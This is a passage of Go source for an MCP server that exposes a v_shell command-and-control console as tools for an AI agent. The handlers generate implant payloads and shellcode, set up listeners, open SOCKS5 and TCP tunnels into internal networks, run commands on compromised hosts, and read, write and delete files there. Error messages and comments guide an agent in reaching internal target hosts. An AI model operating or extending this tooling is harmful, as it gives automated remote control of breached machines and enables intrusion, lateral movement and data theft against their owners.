	if idStr == "" {
		return 0, fmt.Errorf("缺少 host_id 参数")
	}
	id, err := strconv.Atoi(idStr)
	if err != nil {
		return 0, fmt.Errorf("host_id 必须为整数: %s", idStr)
	}
	return id, nil
}

// optionalBool reads an optional boolean argument that clients may send either
// as a JSON boolean or as the string "true"/"false"; it reports whether the
// caller supplied the argument at all, so "not filtered" stays distinguishable
// from "filtered to false".
func optionalBool(r mcp.CallToolRequest, key string) (*bool, bool) {
	raw, ok := r.GetArguments()[key]
	if !ok {
		return nil, false
	}
	switch v := raw.(type) {
	case bool:
		return &v, true
	case string:
		if strings.TrimSpace(v) == "" {
			return nil, false
		}
		b, err := strconv.ParseBool(v)
		if err != nil {
			return nil, false
		}
		return &b, true
	case float64:
		b := v != 0
		return &b, true
	}
	return nil, false
}

// validateListenAddr rejects a listen_addr the server would only fail on later
// with an opaque "open failed".
func validateListenAddr(addr string) error {
	_, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("必须是 host:port 格式(收到 %q,例如 0.0.0.0:21480)", addr)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port <= 0 || port > 65535 {
		return fmt.Errorf("端口必须是 1-65535 的整数(收到 %q)", portStr)
	}
	return nil
}

// --- handlers ---

func (s *Server) handlerServerInfo(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	cfg := s.vs.Info()
	// The password is a credential: keep it out of transcripts and logs unless
	// the caller explicitly asks for it.
	passwordMasked := !r.GetBool("reveal_password", false)
	if passwordMasked && cfg.Password != "" {
		cfg.Password = "******"
	}
	user, err := s.vs.GetUserInfo(ctx)
	if err != nil {
		return mcp.NewToolResultError("获取用户信息失败: " + err.Error()), nil
	}
	db, err := s.vs.GetDashboard(ctx)
	if err != nil {
		return mcp.NewToolResultError("获取服务器信息失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{
		"connection":      cfg,
		"password_masked": passwordMasked,
		"user":            user,
		"server": map[string]any{
			"version":                 db.Version,
			"web_port":                db.WebPort,
			"basic_auth":              db.WebBasicAuth,
			"license_time":            db.LicTime,
			"vip":                     db.VIP,
			"log_level":               db.LogLevel,
			"log_path":                db.LogPath,
			"authorized_client_count": db.ClientNum,
		},
	})
}

// handlerDashboard returns the server metrics plus host counts derived from the
// host-list fields. v_shell's own dashboard reports hostCount=0 even while hosts
// are online (clientCount/clientOnlineCount are the trustworthy pair), and an
// agent that reads hostCount to decide "is anything up?" would conclude nothing
// is. The derived fields keep that decision honest.
func (s *Server) handlerDashboard(ctx context.Context, _ mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	db, err := s.vs.GetDashboard(ctx)
	if err != nil {
		return mcp.NewToolResultError("获取仪表盘信息失败: " + err.Error()), nil
	}
	out := map[string]any{}
	raw, err := json.Marshal(db)
	if err != nil {
		return mcp.NewToolResultError("序列化仪表盘信息失败: " + err.Error()), nil
	}
	if err := json.Unmarshal(raw, &out); err != nil {
		return mcp.NewToolResultError("序列化仪表盘信息失败: " + err.Error()), nil
	}
	out["hosts_total"] = db.ClientCount
	out["hosts_online"] = db.ClientOnlineCount
	if db.HostCount == 0 && db.ClientCount > 0 {
		out["hostCount_warning"] = fmt.Sprintf(
			"服务端 dashboard 的 hostCount=%d,但 clientCount=%d(在线 %d):该字段在 v_shell 侧不可信,"+
				"判断「有没有主机在线」请用 hosts_online / clientOnlineCount 或 list_hosts(online_only=true)。",
			db.HostCount, db.ClientCount, db.ClientOnlineCount)
	}
	return resultJSON(out)
}

// --- client generation handler ---

func (s *Server) handlerGenerateClient(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	kind := r.GetString("kind", "")
	savePath := r.GetString("save_path", "")
	req := vshell.GenerateClientRequest{
		Kind:       kind,
		SavePath:   savePath,
		Arch:       r.GetString("arch", ""),
		ListenerID: int(r.GetFloat("listener_id", 0)),
		TP:         r.GetString("tp", ""),
		Host:       r.GetString("host", ""),
		Port:       int(r.GetFloat("port", 0)),
		Vkey:       r.GetString("vkey", ""),
		Salt:       r.GetString("salt", ""),
		UPX:        r.GetString("upx", ""),
		Proxy:      r.GetString("proxy", ""),
		Format:     r.GetString("format", ""),
	}
	switch kind {
	case vshell.GenStage, vshell.GenStageless, vshell.GenShellcode, vshell.GenDll:
		if req.ListenerID <= 0 {
			return mcp.NewToolResultError("kind=" + kind + " 需要 listener_id(监听器 Id)"), nil
		}
	case vshell.GenListen, vshell.GenListendll:
		if req.Arch == "" || req.TP == "" || req.Host == "" || req.Port <= 0 || req.Vkey == "" || req.Salt == "" {
			return mcp.NewToolResultError("kind=" + kind + " 需要 arch/tp/host/port/vkey/salt 参数"), nil
		}
	case vshell.GenEbpf:
		if req.Arch == "" || req.TP == "" || req.Vkey == "" || req.Salt == "" {
			return mcp.NewToolResultError("kind=ebpf 需要 arch/tp/vkey/salt 参数"), nil
		}
	default:
		return mcp.NewToolResultError("kind 必须是 stage/listen/listendll/stageless/shellcode/dll/ebpf"), nil
	}
	if kind == vshell.GenShellcode && (req.Arch == "" || req.Format == "") {
		return mcp.NewToolResultError("kind=shellcode 需要 arch 与 format(.bin/.c/.raw.txt)参数"), nil
	}
	if req.Arch == "" {
		return mcp.NewToolResultError("缺少 arch 参数"), nil
	}
	if savePath == "" {
		return mcp.NewToolResultError("缺少 save_path 参数"), nil
	}

	serverName, err := s.vs.GenerateClient(ctx, req)
	if err != nil {
		return mcp.NewToolResultError("生成客户端失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{
		"kind": kind, "arch": req.Arch, "save_path": savePath,
		"server_filename": serverName, "generated": true,
	})
}

// --- listener handlers ---

func (s *Server) handlerListListeners(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	// The filter runs here, not on the server: /listener/list answers with every
	// listener regardless of the status field, so forwarding it would advertise
	// a filter that silently does nothing.
	wantStatus, hasStatus := optionalBool(r, "status")
	mode := strings.ToLower(strings.TrimSpace(r.GetString("mode", "")))
	listeners, err := s.vs.ListListeners(ctx, nil, "")
	if err != nil {
		return mcp.NewToolResultError("查看监听器失败: " + err.Error()), nil
	}
	kept := make([]vshell.Listener, 0, len(listeners))
	for _, l := range listeners {
		if hasStatus && l.Status != *wantStatus {
			continue
		}
		if mode != "" && !strings.EqualFold(l.Mode, mode) {
			continue
		}
		kept = append(kept, l)
	}
	out := map[string]any{
		"listeners":        kept,
		"total":            len(kept),
		"total_unfiltered": len(listeners),
		"filtered_out":     len(listeners) - len(kept),
	}
	switch {
	case len(listeners) == 0:
		out["note"] = "当前没有任何监听器(不是被过滤掉的)。"
	case len(kept) == 0:
		out["note"] = fmt.Sprintf("没有符合过滤条件的监听器:共有 %d 个,全部被 status/mode 过滤掉;"+
			"不带过滤参数再查一次即可看到全部。", len(listeners))
	case len(listeners)-len(kept) > 0:
		out["note"] = fmt.Sprintf("共有 %d 个监听器,其中 %d 个被过滤掉。", len(listeners), len(listeners)-len(kept))
	}
	return resultJSON(out)
}

// listenerRequestFrom maps the add/edit listener form fields, which the console
// shares between the two operations.
func listenerRequestFrom(r mcp.CallToolRequest) vshell.AddListenerRequest {
	return vshell.AddListenerRequest{
		ClientId:          int(r.GetFloat("client_id", 0)),
		Mode:              r.GetString("mode", "tcp"),
		Remark:            r.GetString("remark", ""),
		ListenAddr:        r.GetString("listen_addr", ""),
		ConnectAddr:       r.GetString("connect_addr", ""),
		WsConnectAddr:     r.GetString("ws_connect_addr", ""),
		DNSDomain:         r.GetString("dns_domain", ""),
		PublicDNS:         r.GetString("public_dns", ""),
		DisconnectTimeout: int(r.GetFloat("disconnect_timeout", 30)),
		PingInterval:      int(r.GetFloat("ping_interval", 10)),
		Vkey:              r.GetString("vkey", ""),
		EncryptSalt:       r.GetString("encrypt_salt", ""),
		OssUrl:            r.GetString("oss_url", ""),
	}
}

func (s *Server) handlerAddListener(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	req := listenerRequestFrom(r)
	if req.ListenAddr == "" {
		return mcp.NewToolResultError("缺少 listen_addr 参数(服务端监听地址)"), nil
	}
	if err := validateListenAddr(req.ListenAddr); err != nil {
		return mcp.NewToolResultError("listen_addr 无效: " + err.Error()), nil
	}
	if req.Vkey == "" || req.EncryptSalt == "" {
		return mcp.NewToolResultError("vkey 与 encrypt_salt 为必填"), nil
	}
	if err := s.vs.AddListener(ctx, req); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf(
			"新建监听器失败(listen_addr=%s, mode=%s): %v\n"+
				"该地址绑定在 v_shell 服务端主机上,open failed 的常见原因:端口已被占用、无权限绑定、地址不属于服务端本机。"+
				"要在内网目标主机上开监听端口,请改用 generate_client(kind=listen) 生成 bind 载荷 + register_client。",
			req.ListenAddr, req.Mode, err)), nil
	}
	out := map[string]any{
		"mode": req.Mode, "listen_addr": req.ListenAddr,
		"client_id": req.ClientId, "remark": req.Remark, "added": true,
		"bind_location": "v_shell 服务端主机",
	}
	if req.ClientId > 0 {
		out["client_id_note"] = fmt.Sprintf(
			"client_id=%d 只记录绑定关系:监听端口 %s 仍然开在 v_shell 服务端主机上,目标主机上不会出现该端口。"+
				"若想在内网主机上开端口(目标无法反连服务端),用 generate_client(kind=listen) 的 bind 载荷 + register_client 让该主机上线。",
			req.ClientId, req.ListenAddr)
	}
	return resultJSON(out)
}

func listenerID(r mcp.CallToolRequest) (int, error) {
	id, err := r.RequireInt("id")
	if err != nil {
		return 0, fmt.Errorf("id 参数必须为整数")
	}
	return id, nil
}

func (s *Server) handlerStartListener(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return s.setListenerStatus(ctx, r, true)
}

func (s *Server) handlerStopListener(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return s.setListenerStatus(ctx, r, false)
}

func (s *Server) setListenerStatus(ctx context.Context, r mcp.CallToolRequest, enabled bool) (*mcp.CallToolResult, error) {
	id, err := listenerID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	action := "停用"
	if enabled {
		action = "启用"
	}

	// Idempotency: v_shell answers "already start"/"already stop" as an error,
	// which reads like a failure to a caller that simply wanted the listener up.
	// Check the current state first so a repeat call is reported as success.
	var cur *vshell.Listener
	listed, listErr := s.vs.ListListeners(ctx, nil, "")
	if listErr == nil {
		for i := range listed {
			if listed[i].Id == id {
				cur = &listed[i]
				break
			}
		}
		if cur == nil {
			return mcp.NewToolResultError(fmt.Sprintf("监听器 Id %d 不存在(用 list_listeners 查看当前监听器)", id)), nil
		}
		if cur.Status == enabled {
			state := "already_stopped"
			if enabled {
				state = "already_running"
			}
			return resultJSON(map[string]any{
				"id": id, "status": state, "changed": false,
				"note": fmt.Sprintf("监听器 Id %d 本来就是%s状态,无需重复%s;本次未调用服务端接口。",
					id, map[bool]string{true: "运行", false: "停用"}[enabled], action),
			})
		}
	}

	if err := s.vs.SetListenerStatus(ctx, id, enabled); err != nil {
		msg := fmt.Sprintf("%s监听器失败(Id=%d): %v", action, id, err)
		if cur != nil {
			msg += fmt.Sprintf(";调用前状态 Status=%v,模式=%s,监听地址=%s", cur.Status, cur.Mode, cur.ListenAddr)
		}
		return mcp.NewToolResultError(msg), nil
	}
	state := "stopped"
	if enabled {
		state = "started"
	}
	return resultJSON(map[string]any{"id": id, "status": state, "changed": true})
}

func (s *Server) handlerEditListener(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := listenerID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	req := listenerRequestFrom(r)
	if req.ListenAddr == "" {
		return mcp.NewToolResultError("缺少 listen_addr 参数(建议先 list_listeners 读出当前值)"), nil
	}
	if req.Vkey == "" || req.EncryptSalt == "" {
		return mcp.NewToolResultError("vkey 与 encrypt_salt 为必填(建议先 list_listeners 读出当前值)"), nil
	}
	if err := s.vs.EditListener(ctx, id, req); err != nil {
		return mcp.NewToolResultError("修改监听器失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{
		"id": id, "mode": req.Mode, "listen_addr": req.ListenAddr,
		"client_id": req.ClientId, "remark": req.Remark, "edited": true,
	})
}

func (s *Server) handlerSetListenerRemark(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := listenerID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	remark := r.GetString("remark", "")
	if remark == "" {
		return mcp.NewToolResultError("缺少 remark 参数"), nil
	}
	if err := s.vs.SetListenerRemark(ctx, id, remark); err != nil {
		return mcp.NewToolResultError("修改监听器备注失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"id": id, "remark": remark, "saved": true})
}

// --- tunnel handlers ---

func tunnelID(r mcp.CallToolRequest) (int, error) {
	id, err := r.RequireInt("id")
	if err != nil {
		return 0, fmt.Errorf("id 参数必须为整数")
	}
	return id, nil
}

func (s *Server) handlerListTunnels(ctx context.Context, _ mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	tunnels, err := s.vs.ListTunnels(ctx)
	if err != nil {
		return mcp.NewToolResultError("列出隧道失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"tunnels": tunnels, "total": len(tunnels)})
}

func (s *Server) handlerAddTunnel(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	clientID := int(r.GetFloat("client_id", 0))
	port := int(r.GetFloat("port", 0))
	if clientID <= 0 || port <= 0 {
		return mcp.NewToolResultError("client_id 与 port 必须为正整数"), nil
	}
	mode := r.GetString("mode", "socks5")
	req := vshell.AddTunnelRequest{
		ClientId: clientID,
		Mode:     mode,
		Port:     port,
		Target:   r.GetString("target", ""),
		Username: r.GetString("username", ""),
		Password: r.GetString("password", ""),
		Remark:   r.GetString("remark", ""),
	}
	if (mode == "tcp" || mode == "udp") && req.Target == "" {
		return mcp.NewToolResultError("mode=" + mode + " 需要 target 参数(格式 10.1.1.99:80)"), nil
	}
	if err := s.vs.AddTunnel(ctx, req); err != nil {
		return mcp.NewToolResultError("新建隧道失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{
		"client_id": clientID, "mode": mode, "port": port,
		"target": req.Target, "remark": req.Remark, "added": true,
	})
}

func (s *Server) handlerDeleteTunnel(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := tunnelID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	if err := s.vs.DeleteTunnel(ctx, id); err != nil {
		return mcp.NewToolResultError("删除隧道失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"id": id, "deleted": true})
}

func (s *Server) handlerDeleteTunnels(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	ids := r.GetIntSlice("ids", nil)
	if len(ids) == 0 {
		return mcp.NewToolResultError("缺少 ids 参数(隧道 Id 数组)"), nil
	}
	if err := s.vs.DeleteTunnels(ctx, ids); err != nil {
		return mcp.NewToolResultError("批量删除隧道失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"ids": ids, "deleted": true})
}

func (s *Server) handlerStartTunnel(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return s.setTunnelStatus(ctx, r, true)
}

func (s *Server) handlerStopTunnel(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	return s.setTunnelStatus(ctx, r, false)
}

// setTunnelStatus makes start/stop idempotent. The server treats "start" on an
// already-running tunnel as an error ("start error"), which a caller that just
// wants the tunnel up reads as a failure — so the current state decides whether
// the call is needed, and the error message, when one still happens, carries the
// state that makes it diagnosable.
func (s *Server) setTunnelStatus(ctx context.Context, r mcp.CallToolRequest, enable bool) (*mcp.CallToolResult, error) {
	id, err := tunnelID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	action := "停用"
	if enable {
		action = "启用"
	}

	var cur *vshell.Tunnel
	tunnels, listErr := s.vs.ListTunnels(ctx)
	if listErr == nil {
		for i := range tunnels {
			if tunnels[i].Id == id {
				cur = &tunnels[i]
				break
			}
		}
		if cur == nil {
			return mcp.NewToolResultError(fmt.Sprintf("隧道 Id %d 不存在(用 list_tunnels 查看当前隧道)", id)), nil
		}
		if cur.RunStatus == enable {
			state := "already_stopped"
			if enable {
				state = "already_running"
			}
			return resultJSON(map[string]any{
				"id": id, "status": state, "changed": false,
				"mode": cur.Mode, "port": cur.Port, "client_online": cur.IsConnect,
				"note": fmt.Sprintf("隧道 Id %d 本来就是%s状态,无需重复%s;本次未调用服务端接口。",
					id, map[bool]string{true: "运行", false: "停用"}[enable], action),
			})
		}
	}

	var callErr error
	if enable {
		callErr = s.vs.StartTunnel(ctx, id)
	} else {
		callErr = s.vs.StopTunnel(ctx, id)
	}
	if callErr != nil {
		msg := fmt.Sprintf("%s隧道失败(Id=%d): %v", action, id, callErr)
		if cur != nil {
			msg += fmt.Sprintf(";调用前 RunStatus=%v,模式=%s,端口=%d,客户端在线=%v",
				cur.RunStatus, cur.Mode, cur.Port, cur.IsConnect)
			if cur.IsConnect == false {
				msg += ";绑定客户端当前离线,隧道起来也转发不出去"
			}
		}
		msg += ";可用 list_tunnels 确认当前状态,用 probe_tunnel 验证端到端是否通"
		return mcp.NewToolResultError(msg), nil
	}
	state := "stopped"
	if enable {
		state = "started"
	}
	return resultJSON(map[string]any{"id": id, "status": state, "changed": true})
}

// maxProbePayload bounds the request a probe may push through a tunnel: the
// point is a short protocol trigger, not a transfer.
const maxProbePayload = 1024

// probePayload reads the optional send/send_hex arguments.
func probePayload(r mcp.CallToolRequest) ([]byte, error) {
	if hexStr := strings.TrimSpace(r.GetString("send_hex", "")); hexStr != "" {
		cleaned := strings.NewReplacer(" ", "", ":", "", "0x", "", "\n", "", "\t", "").Replace(hexStr)
		raw, err := hex.DecodeString(cleaned)
		if err != nil {
			return nil, fmt.Errorf("send_hex 不是合法十六进制: %v", err)
		}
		if len(raw) > maxProbePayload {
			return nil, fmt.Errorf("send_hex 最多 %d 字节(收到 %d)", maxProbePayload, len(raw))
		}
		return raw, nil
	}
	text := r.GetString("send", "")
	if len(text) > maxProbePayload {
		return nil, fmt.Errorf("send 最多 %d 字节(收到 %d)", maxProbePayload, len(text))
	}
	return []byte(text), nil
}

// handlerProbeTunnel runs a real end-to-end reachability check through a tunnel;
// see vshell.Client.ProbeTunnel for why the verdict comes from the data plane.
func (s *Server) handlerProbeTunnel(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := tunnelID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	payload, err := probePayload(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	timeout := time.Duration(r.GetFloat("timeout_seconds", 5)) * time.Second
	if timeout <= 0 {
		timeout = 5 * time.Second
	}
	if timeout > 30*time.Second {
		timeout = 30 * time.Second
	}
	probe, err := s.vs.ProbeTunnel(ctx, id, r.GetString("target", ""), payload, timeout)
	if err != nil {
		return mcp.NewToolResultError("隧道连通性探测失败: " + err.Error()), nil
	}
	return resultJSON(probe)
}

func (s *Server) handlerEditTunnel(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := tunnelID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	req := vshell.AddTunnelRequest{
		ClientId: int(r.GetFloat("client_id", 0)),
		Mode:     r.GetString("mode", ""),
		Port:     int(r.GetFloat("port", 0)),
		Target:   r.GetString("target", ""),
		Username: r.GetString("username", ""),
		Password: r.GetString("password", ""),
		Remark:   r.GetString("remark", ""),
	}
	if req.ClientId == 0 || req.Mode == "" || req.Port == 0 {
		return mcp.NewToolResultError("编辑至少需要 client_id、mode、port 参数"), nil
	}
	if err := s.vs.EditTunnel(ctx, id, req); err != nil {
		return mcp.NewToolResultError("编辑隧道失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"id": id, "edited": true})
}

func (s *Server) handlerSetTunnelRemark(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := tunnelID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	remark := r.GetString("remark", "")
	if remark == "" {
		return mcp.NewToolResultError("缺少 remark 参数"), nil
	}
	if err := s.vs.SetTunnelRemark(ctx, id, remark); err != nil {
		return mcp.NewToolResultError("修改备注失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"id": id, "remark": remark, "saved": true})
}

func (s *Server) handlerRegisterClient(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	req := vshell.ClientAddRequest{
		Ebpf:  r.GetBool("ebpf", false),
		Tp:    r.GetString("tp", ""),
		IP:    r.GetString("ip", ""),
		Port:  int(r.GetFloat("port", 0)),
		Host:  r.GetString("host", ""),
		Vkey:  r.GetString("vkey", ""),
		Salt:  r.GetString("salt", ""),
		Proxy: r.GetString("proxy", ""),
	}
	if err := s.vs.AddClient(ctx, req); err != nil {
		return mcp.NewToolResultError("注册正向客户端失败: " + err.Error()), nil
	}
	// vkey / salt are credentials: report what was registered without echoing them.
	target := req.Host
	if req.Tp == "" || req.Tp == "tcp" || req.Tp == "kcp" {
		target = fmt.Sprintf("%s:%d", req.IP, req.Port)
	}
	out := map[string]any{
		"registered": true,
		"tp":         req.Tp,
		"target":     target,
		"ebpf":       req.Ebpf,
		"proxy":      req.Proxy,
		"hint": "服务端已尝试正向连接;请用 list_hosts 确认该主机是否出现且 IsConnect=true(可在结果里按 Addr 匹配)。" +
			"注意每次调用都会新增一条记录,重复注册会累积离线记录(需要在控制台删除记录清理)。",
	}
	// Registration is 新增-only, so duplicate records pile up invisibly. Report
	// how many records already point at this address (best effort: the record's
	// Addr/LocalIP carries the address the flow was registered through).
	if req.IP != "" && (req.Tp == "" || req.Tp == "tcp" || req.Tp == "kcp") {
		if hosts, herr := s.vs.ListHosts(ctx, nil); herr == nil {
			same, offline := 0, 0
			for _, h := range hosts {
				if strings.EqualFold(h.Addr, req.IP) || strings.EqualFold(h.LocalIP, req.IP) {
					same++
					if !h.IsConnect {
						offline++
					}
				}
			}
			out["records_matching_target"] = same
			out["records_matching_target_offline"] = offline
			if same > 1 {
				out["duplicate_note"] = fmt.Sprintf(
					"控制台里已有 %d 条 Addr/LocalIP 命中 %s 的记录(其中 %d 条离线,可能包含本次新增):"+
						"重复注册会累积离线记录,可在控制台的客户端列表里删除这些记录,只保留在线的那条。",
					same, req.IP, offline)
			}
		}
	}
	return resultJSON(out)
}

func (s *Server) handlerListHosts(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	online := false
	if v := r.GetString("online_only", ""); v != "" {
		online, _ = strconv.ParseBool(v)
	}
	hosts, err := s.vs.ListHosts(ctx, &online)
	if err != nil {
		return mcp.NewToolResultError("列出主机失败: " + err.Error()), nil
	}
	filterID, _ := hostID(r)
	if filterID > 0 {
		kept := hosts[:0]
		for _, h := range hosts {
			if h.Id == filterID {
				kept = append(kept, h)
			}
		}
		hosts = kept
	}
	if len(hosts) == 0 {
		return mcp.NewToolResultText("未找到匹配的主机(请确认 host_id 与在线状态)。"), nil
	}
	return resultJSON(hosts)
}

func (s *Server) handlerExecCommand(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	command := r.GetString("command", "")
	if command == "" {
		return mcp.NewToolResultError("缺少 command 参数"), nil
	}
	workdir := r.GetString("workdir", "")
	timeout := time.Duration(r.GetFloat("timeout_seconds", 60)) * time.Second
	res, err := s.vs.Exec(ctx, id, command, workdir, timeout)
	if err != nil {
		return mcp.NewToolResultError("命令执行失败: " + err.Error()), nil
	}
	if res.Interactive != "" {
		return mcp.NewToolResultError(fmt.Sprintf(
			"命令停在交互式提示 %q 上等待输入,已在检测到时立即中止(不再空等到超时)。"+
				"请改用非交互写法:例如把 `| more` 换成重定向到文件后再 read_file,或改用 findstr 过滤;"+
				"`pause`、`set /p`、`choice` 这类命令在无人值守场景不可用。已捕获的部分输出:\n%s",
			res.Interactive, decodeCommandOutput(previewOutput(res.Output)).Text)), nil
	}
	if res.TimedOut {
		return mcp.NewToolResultError(fmt.Sprintf(
			"命令在 %s 内未结束(未收到结束标记),可能仍在目标主机上运行;已捕获的部分输出:\n%s",
			timeout, decodeCommandOutput(previewOutput(res.Output)).Text)), nil
	}
	decoded := decodeCommandOutput(res.Output)
	out := map[string]any{
		"host_id":   id,
		"command":   command,
		"exit_code": res.ExitCode,
		"ok":        res.ExitCode == 0,
		"output":    decoded.Text,
	}
	for k, v := range decoded.Meta {
		out[k] = v
	}
	return resultJSON(out)
}

func (s *Server) handlerListDirectory(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "/")
	items, err := s.vs.ListDirectory(ctx, id, path)
	if err != nil {
		return mcp.NewToolResultError("列目录失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "items": items, "total": len(items)})
}

func (s *Server) handlerGetDisks(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	disks, err := s.vs.GetDisks(ctx, id)
	if err != nil {
		return mcp.NewToolResultError("获取磁盘信息失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "disks": disks})
}

func (s *Server) handlerReadFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	filename := r.GetString("filename", "")
	if path == "" || filename == "" {
		return mcp.NewToolResultError("缺少 path 或 filename 参数"), nil
	}
	fc, err := s.vs.ReadFile(ctx, id, path, filename)
	if err != nil {
		return mcp.NewToolResultError("读取文件失败: " + err.Error()), nil
	}
	out := map[string]any{
		"host_id": id, "path": path, "filename": filename,
		"content": fc.Content, "base64_encoded": fc.Base64Encoded,
	}
	if fc.ReplacedRunes > 0 {
		out["bytes_replaced"] = fc.ReplacedRunes
		out["encoding_warning"] = fmt.Sprintf(
			"内容含 %d 个 U+FFFD 替换字符:v_shell 服务端(/file/cat)会把无法按 UTF-8 解码的字节替换掉,"+
				"原始字节已不可恢复(该文件很可能是 GBK/ANSI 等本地编码)。"+
				"需要原始内容请改用 download_file(二进制通道)取回后本地解码,或在目标机上用 execute_command 转码。",
			fc.ReplacedRunes)
	}
	return resultJSON(out)
}

func (s *Server) handlerWriteFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	filename := r.GetString("filename", "")
	content := r.GetString("content", "")
	if path == "" || filename == "" {
		return mcp.NewToolResultError("缺少 path 或 filename 参数"), nil
	}
	if err := s.vs.WriteFile(ctx, id, path, filename, content); err != nil {
		return mcp.NewToolResultError("写入文件失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "filename": filename, "written": true})
}

func (s *Server) handlerCreateDirectory(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	dirname := r.GetString("dirname", "")
	if path == "" || dirname == "" {
		return mcp.NewToolResultError("缺少 path 或 dirname 参数"), nil
	}
	if err := s.vs.CreateDirectory(ctx, id, path, dirname); err != nil {
		return mcp.NewToolResultError("新建目录失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "dirname": dirname, "created": true})
}

func (s *Server) handlerCreateFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	filename := r.GetString("filename", "")
	if path == "" || filename == "" {
		return mcp.NewToolResultError("缺少 path 或 filename 参数"), nil
	}
	if err := s.vs.CreateFile(ctx, id, path, filename); err != nil {
		return mcp.NewToolResultError("新建文件失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "filename": filename, "created": true})
}

func (s *Server) handlerDeleteFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	filename := r.GetString("filename", "")
	if path == "" || filename == "" {
		return mcp.NewToolResultError("缺少 path 或 filename 参数"), nil
	}
	if err := s.vs.DeleteFile(ctx, id, path, filename); err != nil {
		return mcp.NewToolResultError("删除失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "filename": filename, "deleted": true})
}

func (s *Server) handlerDeleteFiles(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}
	path := r.GetString("path", "")
	names := r.GetStringSlice("names", nil)
	if path == "" || len(names) == 0 {
		return mcp.NewToolResultError("缺少 path 或 names 参数"), nil
	}
	if err := s.vs.DeleteFiles(ctx, id, path, names); err != nil {
		return mcp.NewToolResultError("批量删除失败: " + err.Error()), nil
	}
	return resultJSON(map[string]any{"host_id": id, "path": path, "names": names, "deleted": true})
}

func (s *Server) handlerRenameFile(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	id, err := hostID(r)
	if err != nil {
